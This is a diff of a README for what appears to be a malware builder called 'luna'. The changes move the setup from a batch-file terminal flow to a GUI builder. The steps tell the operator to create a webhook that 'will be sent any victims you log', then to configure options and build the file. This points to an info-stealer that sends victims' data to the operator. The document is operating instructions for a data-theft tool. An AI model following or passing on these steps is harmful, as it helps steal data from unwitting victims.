@@ -70,36 +70,30 @@
 ### 1. Download Python:
 
 ```
-Make sure you have Python installed and it is added to your 
+Make sure you have Python installed and it is added to your path
 ```
 ### 1. Download The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
-### 2. Open The build.bat File:
+### 2. Open The setup.bat File:
 
 ```
-You dont need to install any modules opening this will install them for you. Then you can open the build.bat which will
-open a terminal with the luna logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
+You dont need to install any modules opening the install them for you. Then you can open the builder.by file which will
+open the gui..
 ```
 ### 3. Create A Webhook:
 
 ```
 This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
-into the terminal when prompted.
+into the box which asks for your webhook.
 ```
 ### 4. Configurable Options:
 
 ```
-Now once you've given your file a name you can pick between some options by typing either y or n for each one. After
-having done that the file will be built and ready for usage.
-```
-### 5. Test The File:
-
-```
-You will then be promtped as to whether you want to run the file or not. I recommend this so you
-can see if there are any issues or not.
+Now once you've done that you can tick on the options that you want enabled and anything you don't understand you can go 
+to the documentation where each option is explained.
 ```
 ### 6. What Now?
 
